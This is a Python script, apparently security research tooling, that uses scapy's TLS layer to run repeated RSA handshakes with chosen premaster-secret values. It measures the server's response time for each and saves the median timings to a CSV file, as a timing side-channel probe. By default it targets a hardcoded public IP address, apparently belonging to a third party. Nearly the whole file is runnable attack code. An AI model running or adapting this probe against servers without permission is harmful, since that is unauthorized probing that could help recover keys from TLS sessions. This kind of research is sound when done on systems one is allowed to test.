#!/usr/bin/env python
# -*- coding: utf-8 -*-

from __future__ import with_statement
from __future__ import print_function

from scapy.layers.ssl_tls import *
from scapy.layers.ssl_tls_crypto import *
import scapy.layers.ssl_tls as tls
import time
import numpy
import csv

start_time = 0
time_diff = 0
tls_version = TLSVersion.TLS_1_0
#ciphers = [TLSCipherSuite.ECDHE_RSA_WITH_AES_128_GCM_SHA256]
#ciphers = [TLSCipherSuite.ECDHE_RSA_WITH_AES_256_CBC_SHA384]
ciphers = [TLSCipherSuite.RSA_WITH_AES_128_CBC_SHA]
# ciphers = [TLSCipherSuite.RSA_WITH_RC4_128_SHA]
# ciphers = [TLSCipherSuite.DHE_RSA_WITH_AES_128_CBC_SHA]
# ciphers = [TLSCipherSuite.DHE_DSS_WITH_AES_128_CBC_SHA]
extensions = [TLSExtension() / TLSExtECPointsFormat(),
              TLSExtension() / TLSExtSupportedGroups()]


def verify_data_1(tls_ctx, data=None):

    if tls_ctx.negotiated.version >= tls.TLSVersion.TLS_1_3:
        if tls_ctx.client:
            prf_verify_data = tls_ctx.derive_client_finished()
        else:
            prf_verify_data = tls_ctx.derive_server_finished()
    else:
        if tls_ctx.client:
            label = TLSPRF.TLS_MD_CLIENT_FINISH_CONST
        else:
            label = TLSPRF.TLS_MD_SERVER_FINISH_CONST
        if data is None:
            verify_data = []
            for handshake in tls_ctx._walk_handshake_msgs():
                if handshake.haslayer(tls.TLSFinished):
                    # Special case of encrypted handshake. Remove crypto material to compute verify_data
                    verify_data.append("%s%s%s" % (chr(handshake.type), struct.pack(">I", handshake.length)[1:],
                                                   handshake[tls.TLSFinished].data))
                else:
                    verify_data.append(str(handshake))
        else:
            verify_data = [data]

    if tls_ctx.negotiated.version == tls.TLSVersion.TLS_1_2:
        prf_verify_data = tls_ctx.prf.get_bytes(tls_ctx.master_secret, label,
                                             tls_ctx.prf.digest.new("".join(verify_data)).digest(),
                                             num_bytes=12)
    else:
        prf_verify_data = tls_ctx.prf.get_bytes(tls_ctx.master_secret, label,
                                             "%s%s" % (MD5.new("".join(verify_data)).digest(),
                                                       SHA.new("".join(verify_data)).digest()),
                                             num_bytes=12)
    return prf_verify_data

def tls_do_round_trip_1(tls_socket, pkt, recv=True):
    resp = TLS()
    global start_time
    global time_diff
    try:
        tls_socket.sendall(pkt)        
        start_time = time.time()
        if recv:
            if start_time != 0:
                time_diff = time.time() - start_time
            resp = tls_socket.recvall()
            if resp.haslayer(TLSAlert):
                alert = resp[TLSAlert]
                if alert.level != TLSAlertLevel.WARNING:
                    level = TLS_ALERT_LEVELS.get(alert.level, "unknown")
                    description = TLS_ALERT_DESCRIPTIONS.get(alert.description, "unknown description")
                    if time_diff != 0:
                        print("--- %s seconds ---" % (time_diff))
                    raise TLSProtocolError("%s alert returned by server: %s" % (level.upper(), description.upper()), pkt, resp)
    except socket.error as se:
        if start_time != 0:
            time_diff = time.time() - start_time
        if time_diff != 0:
            print("--- %s seconds ---" % (time_diff))
        raise TLSProtocolError(se, pkt, resp)
    return resp

def tls_handshake_1(tls_socket, version, ciphers, premaster_key=None, extensions=[]):
    if version <= TLSVersion.TLS_1_2:
        if premaster_key != None:
            tls_socket.tls_ctx.premaster_secret = premaster_key
        client_hello = TLSRecord(version=version) / \
                       TLSHandshakes(handshakes=[TLSHandshake() /
                                                 TLSClientHello(version=version,
                                                                cipher_suites=ciphers,
                                                                extensions=extensions)])
        hexdump(tls_socket.tls_ctx.premaster_secret)
        resp1 = tls_do_round_trip(tls_socket, client_hello)
        #if premaster_key != None:
            #tls_socket.tls_ctx.premaster_secret = premaster_key
        #tls_socket.tls_ctx.premaster_secret = "%s%s" % (struct.pack("!H", client_hello.version), 'a'*46)
        
        client_key_exchange = TLSRecord(version=version) / \
                              TLSHandshakes(handshakes=[TLSHandshake() /
                                                        tls_socket.tls_ctx.get_client_kex_data()])
       
        client_ccs = TLSRecord(version=version) / TLSChangeCipherSpec()
        tls_do_round_trip_1(tls_socket, TLS.from_records([client_key_exchange, client_ccs]), False)
       
       


        #resp2 = tls_do_round_trip(tls_socket, TLSHandshakes(handshakes=[TLSHandshake() /
                                                                        #TLSFinished(data=tls_socket.tls_ctx.get_verify_data())]))
        resp2 = tls_do_round_trip_1(tls_socket, TLSHandshakes(handshakes=[TLSHandshake() /
                                                                        TLSFinished(data=verify_data_1(tls_socket.tls_ctx))]))
        #resp2 = tls_do_round_trip(tls_socket, TLSHandshakes(handshakes=[TLSHandshake() /
                                                                        #TLSFinished(data="abc")]))
        
        return resp1, resp2



def tls_timer(ip, premaster_key = None):
    global start_time
    global time_diff    
    start_time = 0
    time_diff = 0
    with TLSSocket(client=True) as tls_socket:
        try:
            #tls_socket._s = socket.socket()
            tls_socket.__init__(sock=socket.socket(), client=True)
            tls_socket.connect(ip)
            print("Connected to server: %s" % (ip,))
        except socket.timeout:
            print("Failed to open connection to server: %s" % (ip,), file=sys.stderr)
        except socket.error, v:
            print ("Unexpected error:", sys.exc_info()[0])
            print (v[0])
        else:
            try:
                server_hello, server_kex = tls_handshake_1(tls_socket, tls_version, ciphers, premaster_key, extensions)
                server_hello.show()
            except TLSProtocolError as tpe:
                
                #tpe.response.show()
                
                if time_diff != 0:
                    return time_diff
                elif start_time != 0:
                    time_diff = time.time() - start_time
                    print("---- %s seconds ----" % (time_diff))
                print("Got TLS error: %s" % tpe, file=sys.stderr)
                return time_diff

            except NotImplementedError as nie:
                print("NotImplementedError: %s" % nie, file=sys.stderr)
                return 0
            else:
                resp = tls_socket.do_round_trip(TLSPlaintext(data="GET / HTTP/1.1\r\nHOST: www.google.com\r\n\r\n"))
                print("Got response from server")
                resp.show()
                return 0
            finally:
                #print(tls_socket.tls_ctx)
                return time_diff

def splus(s1,s2):    
    # convert strings to a list of character pair tuples
    # go through each tuple, converting them to ASCII code (ord)
    # perform exclusive or on the ASCII code
    # then convert the result back to ASCII (chr)
    # merge the resulting array of characters as a string
    return ''.join(chr(ord(a) + ord(b)) for a,b in zip(s1,s2))

if __name__ == "__main__":
    if len(sys.argv) > 2:
        server = (sys.argv[1], int(sys.argv[2]))
    else:
        server = ("172.217.7.142", 443)
    """
    pmsdata = range(256*256)
    timingdata = []
    pms = "\x00\x00"
    for i in range(256):
        for j in range(256):
            hexdump(pms)            
            key = pms + "\x00" * 46
            time_list = []
            for k in range(10):
                try:
                    dtime = tls_timer(server,key)
                    
                except:
                    pass
                finally:
                    time_list.append(dtime)
            timingdata.append(numpy.median(numpy.array(time_list)))
            if j != 255:
                pms = splus(pms, "\x00\x01")
        pms = pms[0] + "\x00"
        if i != 255:
            pms = splus(pms, "\x01\x00")

    with open('timingdata.csv', 'wb') as csvfile:
        writer = csv.writer(csvfile)
        for i in pmsdata:
            writer.writerow([str(pmsdata[i])] + [str(timingdata[i])])
    """
    pmsdata = range(16)
    timingdata = []
    pms = "\xd0"
    for i in range(16):        
        hexdump(pms)            
        key = "\x00"*16 + pms + "\x00" * 31
        time_list = []
        for k in range(10):
            try:
                dtime = tls_timer(server,key)                
            except:
                pass
            finally:
                time_list.append(dtime)
                #print(time_list)
        timingdata.append(numpy.median(numpy.array(time_list)))
        if i != 15:
            pms = splus(pms, "\x01")
    with open('timingdata.csv', 'wb') as csvfile:
        writer = csv.writer(csvfile)
        for i in pmsdata:
            writer.writerow([str(pmsdata[i])] + [str(timingdata[i])])
    #tls_timer(server,"a"*48)
    #tls_timer(server)